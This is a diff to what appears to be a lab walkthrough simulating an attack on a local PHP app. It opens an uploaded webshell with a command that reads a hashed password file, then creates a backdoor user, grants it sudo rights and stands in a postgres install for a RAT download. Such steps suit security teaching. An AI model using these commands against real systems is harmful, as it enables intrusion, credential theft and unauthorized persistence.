@@ -13,4 +13,37 @@ e.g. https://example.com/uploads/hello_world.txt
 4) Attacker opens the webshell.
 - The link will fail, since it is an executable that needs input
 - simply add this '?cmd=ls' at the end of the link containing 'malicious.php?'
-- should look like this: 'http://localhost:4000/php_app/uploads/malicious.php?cmd=ls'
+- should look like this: 'http://localhost:4000/php_app/uploads/malicious.php?cmd=(cd%20../..;ls;cat%20hashed_passwords.txt)'
+
+
+5) Then, he logins as root
+6) He adds a user
+sudo adduser newusername
+
+Note: the echo command prints the values on the command line, replicating us entering user input
+Linux asks for an input of 'username, password, confirm_password, then some random inputs where we can just spam enter key"
+echo -e "newuser\nsc3010\nsc3010\n\n\n\n\n\n" | sudo adduser newuser
+6.1) check if new user is created
+cat /etc/passwd
+
+7) grants the user admin priv
+sudo usermod -aG sudo newuser
+
+
+8) Login as the new user
+su - newuser
+
+9) verify the new user priv
+sudo whoami
+
+10) After creating a new user, the attacker can use the new user’s credentials to log in to the system via SSH, RDP,
+or any other remote access method available.
+
+11) now, download postgres to simulate downloading malware, using apt install. Hackers can easily download a RAT (Remote Access Trojan)
+sudo apt install postgresql
+
+12) hackers used the malware to hack into the memory of the system to steal transaction details.
+
+For deleting the user:
+sudo deluser username
+
